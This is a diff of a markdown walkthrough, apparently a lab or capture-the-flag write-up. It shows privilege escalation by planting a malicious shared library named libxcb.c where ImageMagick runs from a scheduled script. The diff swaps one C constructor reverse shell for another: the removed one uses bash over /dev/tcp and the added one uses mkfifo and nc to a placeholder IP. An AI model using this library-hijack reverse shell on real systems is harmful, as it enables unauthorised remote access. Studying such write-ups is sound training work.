@@ -207,19 +207,25 @@ find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magic
 ```
 
 + We can manipulate the path `/opt/app/static/assets/images` to spawn the reverse shell.
-+ Firstly, we access `/opt/app/static/assets/images` and create the file shell.c 
++ Firstly, we access `/opt/app/static/assets/images` and create the file libxcb.c
 
 ```C
 #include <stdio.h>
 #include <stdlib.h>
 
-void __attribute__((constructor))
-init() {
-       system("/bin/bash -i >& /dev/tcp/<IP>/1234 0>&1");
-       exit(0);
+__attribute__((constructor)) void init(){
+
+system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> 4444 >/tmp/f");
+exit(0);
 }
 ```
 
 + Compile the code into a shared object at the location `/opt/app/static/assets/images` where the file `identify_images.sh` execute.
- 
 
+![alt text](image-13.png)
+
++ Use netcat to capture reverse shell.
+
+![alt text](image-14.png)
+
+-------------------------------------------
